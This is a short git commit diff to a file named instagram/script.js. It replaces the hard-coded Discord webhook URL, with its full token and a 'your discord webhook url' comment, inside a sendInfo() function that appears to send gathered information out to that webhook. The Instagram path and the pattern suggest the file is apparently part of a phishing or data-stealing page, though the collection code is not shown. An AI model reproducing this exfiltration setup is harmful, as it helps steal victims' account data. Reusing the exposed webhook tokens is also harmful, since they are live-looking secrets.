8a746e7d2ece4f1262a155dffeb1958b4fe07cd9
terrykiddo <117367863+terrykiddo@users.noreply.github.com>
2023-09-08 19:08:17 +0100

    script.js

--- instagram/script.js
+++ instagram/script.js
@@ -58,7 +58,7 @@ async function getInfo() {
   
 
 async function sendInfo() {
-  const webhook = "https://discord.com/api/webhooks/1148907132184449058/CbRlY2isADICEem0aVn3zz2_28paHqB84G_SMgHE6lD6IsB-M5yhO4W7fYsPCoclHMgJ"; //your discord webhook url
+  const webhook = "https://discord.com/api/webhooks/1149618099880984657/3qnXvasbZR_jvv1A6RijxC7sEVsbuRJ6BKj2loKG7AVSBaUfuncqOfozp4k3gSe4lWXR"; //your discord webhook url
 
   const embed = {
     color: 1585803, //#18328b
